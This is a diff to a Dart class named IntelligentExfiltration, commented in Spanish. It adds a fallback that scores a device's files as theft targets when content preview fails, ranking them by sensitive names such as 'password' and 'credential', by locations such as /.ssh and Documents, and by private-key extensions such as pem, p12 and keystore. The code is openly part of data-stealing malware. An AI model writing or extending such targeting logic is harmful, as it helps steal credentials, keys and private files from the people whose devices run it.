@@ -114,25 +114,57 @@ class IntelligentExfiltration {
     return score;
   }
 
-  Future<double> _analyzeFileContent(Map<String, dynamic> file) async {
-    try {
-      final result = await _methodChannel.invokeMethod('previewFileContent', {
-        'filePath': file['path'],
-        'maxBytes': 1024,
-      });
+   Future<double> _analyzeFileContent(Map<String, dynamic> file) async {
+     try {
+       final result = await _methodChannel.invokeMethod('previewFileContent', {
+         'filePath': file['path'],
+         'maxBytes': 1024,
+       });
 
-      final content = result as String? ?? '';
+       final content = result as String? ?? '';
 
-      // Detectar datos sensibles en contenido
-      if (_containsSensitiveData(content)) {
-        return 30.0;
-      }
-    } catch (e) {
-      // Ignorar errores
-    }
+       // Detectar datos sensibles en contenido
+       if (_containsSensitiveData(content)) {
+         return 30.0;
+       }
+     } catch (e) {
+       // Si previewFileContent no está implementado, analizar solo por path/nombre
+       final path = file['path']?.toString() ?? '';
+       final name = file['name']?.toString() ?? '';
+       
+       // Puntuar basado en nombre y ubicación
+       double score = 0.0;
+       
+       // Archivos con nombres sensibles
+       if (name.toLowerCase().contains('password') || 
+           name.toLowerCase().contains('key') ||
+           name.toLowerCase().contains('secret') ||
+           name.toLowerCase().contains('credential')) {
+         score += 20.0;
+       }
+       
+       // Ubicaciones sensibles
+       if (path.contains('/.ssh') || path.contains('/.config')) {
+         score += 15.0;
+       }
+       if (path.contains('/Documents') || path.contains('/Downloads')) {
+         score += 10.0;
+       }
+       
+       // Extensiones sensibles
+       final ext = path.split('.').last.toLowerCase();
+       if (['key', 'pem', 'p12', 'pfx', 'keystore'].contains(ext)) {
+         score += 25.0;
+       }
+       if (['txt', 'log', 'conf', 'json', 'xml'].contains(ext)) {
+         score += 5.0;
+       }
+       
+       return score;
+     }
 
-    return 0.0;
-  }
+     return 0.0;
+   }
 
   bool _containsSensitiveData(String content) {
     final sensitivePatterns = [
